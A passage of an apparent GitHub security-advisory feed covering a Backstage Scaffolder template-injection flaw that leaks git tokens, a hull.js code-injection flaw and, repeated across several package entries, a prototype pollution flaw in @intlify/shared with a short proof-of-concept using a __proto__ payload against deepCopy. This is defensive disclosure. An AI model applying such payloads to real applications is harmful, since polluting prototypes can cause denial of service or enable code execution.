<p>A vulnerability is identified in Backstage Scaffolder template functionality where Server-Side Template Injection (SSTI) can be exploited to perform Git config injection. The vulnerability allows an attacker to capture privileged git tokens used by the Backstage Scaffolder plugin. With these tokens, unauthorized access to sensitive resources in git can be achieved. The impact is considered medium severity as the Backstage Threat Model recommends restricting access to adding and editing templates in the Backstage Catalog plugin.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been resolved in versions <code>v0.4.12</code>, <code>v0.5.1</code> and <code>v0.6.1</code> of the <code>@backstage/plugin-scaffolder-node</code> package. Users are encouraged to upgrade to this version to mitigate the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users can ensure that templates do not change git config.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in the <a href="https://github.com/backstage/backstage">Backstage repository</a>
Visit our Discord, linked to in <a href="https://github.com/backstage/backstage">Backstage README</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/backstage/backstage/security/advisories/GHSA-qmc2-jpr5-7rg9">https://github.com/backstage/backstage/security/advisories/GHSA-qmc2-jpr5-7rg9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53983">https://nvd.nist.gov/vuln/detail/CVE-2024-53983</a></li>
<li><a href="https://github.com/backstage/backstage/tree/master/plugins/scaffolder-node">https://github.com/backstage/backstage/tree/master/plugins/scaffolder-node</a></li>
<li><a href="https://github.com/advisories/GHSA-qmc2-jpr5-7rg9">https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T21:36:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@backstage/plugin-scaffolder-node] Backstage Scaffolder plugin vulnerable to Server-Side Request Forgery]]></title>
        <id>https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</id>
        <link href="https://github.com/advisories/GHSA-qmc2-jpr5-7rg9"/>
        <updated>2024-12-02T21:36:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A vulnerability is identified in Backstage Scaffolder template functionality where Server-Side Template Injection (SSTI) can be exploited to perform Git config injection. The vulnerability allows an attacker to capture privileged git tokens used by the Backstage Scaffolder plugin. With these tokens, unauthorized access to sensitive resources in git can be achieved. The impact is considered medium severity as the Backstage Threat Model recommends restricting access to adding and editing templates in the Backstage Catalog plugin.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been resolved in versions <code>v0.4.12</code>, <code>v0.5.1</code> and <code>v0.6.1</code> of the <code>@backstage/plugin-scaffolder-node</code> package. Users are encouraged to upgrade to this version to mitigate the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users can ensure that templates do not change git config.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in the <a href="https://github.com/backstage/backstage">Backstage repository</a>
Visit our Discord, linked to in <a href="https://github.com/backstage/backstage">Backstage README</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/backstage/backstage/security/advisories/GHSA-qmc2-jpr5-7rg9">https://github.com/backstage/backstage/security/advisories/GHSA-qmc2-jpr5-7rg9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53983">https://nvd.nist.gov/vuln/detail/CVE-2024-53983</a></li>
<li><a href="https://github.com/backstage/backstage/tree/master/plugins/scaffolder-node">https://github.com/backstage/backstage/tree/master/plugins/scaffolder-node</a></li>
<li><a href="https://github.com/advisories/GHSA-qmc2-jpr5-7rg9">https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T21:36:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hull.js] hull.js Code Injection Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-q849-wxrc-vqrp</id>
        <link href="https://github.com/advisories/GHSA-q849-wxrc-vqrp"/>
        <updated>2024-12-02T20:11:40.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the library from 0.2.2 to 1.0.9 are vulnerable to the arbitrary code execution due to unsafe usage of <code>new Function(...)</code> in the module that handles points format. Applications passing the 3rd parameter to the <code>hull</code> function without sanitising may be impacted. The vulnerability has been fixed in version 1.0.10, please update the library. Check project homepage on GitHub to see how to fetch the latest version: <a href="https://github.com/andriiheonia/hull?tab=readme-ov-file#npm-package">https://github.com/andriiheonia/hull?tab=readme-ov-file#npm-package</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AndriiHeonia/hull/security/advisories/GHSA-q849-wxrc-vqrp">https://github.com/AndriiHeonia/hull/security/advisories/GHSA-q849-wxrc-vqrp</a></li>
<li><a href="https://github.com/AndriiHeonia/hull/commit/9de6f9549b74fbb68bf4d5a449147b4c1d7cda0a">https://github.com/AndriiHeonia/hull/commit/9de6f9549b74fbb68bf4d5a449147b4c1d7cda0a</a></li>
<li><a href="https://github.com/advisories/GHSA-q849-wxrc-vqrp">https://github.com/advisories/GHSA-q849-wxrc-vqrp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q849-wxrc-vqrp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-12-02T20:11:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vue-i18n] @intlify/shared Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</id>
        <link href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c"/>
        <updated>2024-12-02T17:26:48.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type: Prototype Pollution</strong></p>
<p><strong>Affected Package:</strong></p>
<p>Product: @intlify/shared
Version: 10.0.4</p>
<p><strong>Vulnerability Location(s):</strong></p>
<p><code>node_modules/@intlify/shared/dist/shared.cjs:232:26</code></p>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/shared (10.0.4)</code> is vulnerable to Prototype Pollution through the entry function(s) <code>lib.deepCopy</code>. An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/shared@10.0.4
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('@intlify/shared');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<p><strong>References</strong></p>
<p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Prototype Pollution Leading to Remote Code Execution</a> - An example of how prototype pollution can lead to command code injection.</p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html">OWASP Prototype Pollution Prevention Cheat Sheet</a> - Best practices for preventing prototype pollution.</p>
<p><a href="https://portswigger.net/web-security/prototype-pollution/preventing">PortSwigger Guide on Preventing Prototype Pollution</a> - A detailed guide to securing your applications against prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52810">https://nvd.nist.gov/vuln/detail/CVE-2024-52810</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/vue-i18n-core] @intlify/shared Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</id>
        <link href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c"/>
        <updated>2024-12-02T17:26:48.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type: Prototype Pollution</strong></p>
<p><strong>Affected Package:</strong></p>
<p>Product: @intlify/shared
Version: 10.0.4</p>
<p><strong>Vulnerability Location(s):</strong></p>
<p><code>node_modules/@intlify/shared/dist/shared.cjs:232:26</code></p>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/shared (10.0.4)</code> is vulnerable to Prototype Pollution through the entry function(s) <code>lib.deepCopy</code>. An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/shared@10.0.4
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('@intlify/shared');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<p><strong>References</strong></p>
<p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Prototype Pollution Leading to Remote Code Execution</a> - An example of how prototype pollution can lead to command code injection.</p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html">OWASP Prototype Pollution Prevention Cheat Sheet</a> - Best practices for preventing prototype pollution.</p>
<p><a href="https://portswigger.net/web-security/prototype-pollution/preventing">PortSwigger Guide on Preventing Prototype Pollution</a> - A detailed guide to securing your applications against prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52810">https://nvd.nist.gov/vuln/detail/CVE-2024-52810</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/shared] @intlify/shared Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</id>
        <link href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c"/>
        <updated>2024-12-02T17:26:48.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type: Prototype Pollution</strong></p>
<p><strong>Affected Package:</strong></p>
<p>Product: @intlify/shared
Version: 10.0.4</p>
<p><strong>Vulnerability Location(s):</strong></p>
<p><code>node_modules/@intlify/shared/dist/shared.cjs:232:26</code></p>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/shared (10.0.4)</code> is vulnerable to Prototype Pollution through the entry function(s) <code>lib.deepCopy</code>. An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/shared@10.0.4
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('@intlify/shared');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<p><strong>References</strong></p>
<p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Prototype Pollution Leading to Remote Code Execution</a> - An example of how prototype pollution can lead to command code injection.</p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html">OWASP Prototype Pollution Prevention Cheat Sheet</a> - Best practices for preventing prototype pollution.</p>
<p><a href="https://portswigger.net/web-security/prototype-pollution/preventing">PortSwigger Guide on Preventing Prototype Pollution</a> - A detailed guide to securing your applications against prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52810">https://nvd.nist.gov/vuln/detail/CVE-2024-52810</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[petite-vue-i18n] @intlify/shared Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</id>
        <link href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c"/>
        <updated>2024-12-02T17:26:48.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type: Prototype Pollution</strong></p>
<p><strong>Affected Package:</strong></p>
<p>Product: @intlify/shared
Version: 10.0.4</p>
<p><strong>Vulnerability Location(s):</strong></p>
<p><code>node_modules/@intlify/shared/dist/shared.cjs:232:26</code></p>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/shared (10.0.4)</code> is vulnerable to Prototype Pollution through the entry function(s) <code>lib.deepCopy</code>. An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/shared@10.0.4
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('@intlify/shared');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<p><strong>References</strong></p>
<p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Prototype Pollution Leading to Remote Code Execution</a> - An example of how prototype pollution can lead to command code injection.</p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html">OWASP Prototype Pollution Prevention Cheat Sheet</a> - Best practices for preventing prototype pollution.</p>
<p><a href="https://portswigger.net/web-security/prototype-pollution/preventing">PortSwigger Guide on Preventing Prototype Pollution</a> - A detailed guide to securing your applications against prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52810">https://nvd.nist.gov/vuln/detail/CVE-2024-52810</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vue-i18n] @intlify/shared Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</id>
        <link href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c"/>
        <updated>2024-12-02T17:26:48.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type: Prototype Pollution</strong></p>
<p><strong>Affected Package:</strong></p>
<p>Product: @intlify/shared
Version: 10.0.4</p>
<p><strong>Vulnerability Location(s):</strong></p>
<p><code>node_modules/@intlify/shared/dist/shared.cjs:232:26</code></p>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/shared (10.0.4)</code> is vulnerable to Prototype Pollution through the entry function(s) <code>lib.deepCopy</code>. An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/shared@10.0.4
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('@intlify/shared');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<p><strong>References</strong></p>
<p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Prototype Pollution Leading to Remote Code Execution</a> - An example of how prototype pollution can lead to command code injection.</p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html">OWASP Prototype Pollution Prevention Cheat Sheet</a> - Best practices for preventing prototype pollution.</p>
<p><a href="https://portswigger.net/web-security/prototype-pollution/preventing">PortSwigger Guide on Preventing Prototype Pollution</a> - A detailed guide to securing your applications against prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52810">https://nvd.nist.gov/vuln/detail/CVE-2024-52810</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:47.000Z</published>
    </entry>
</feed>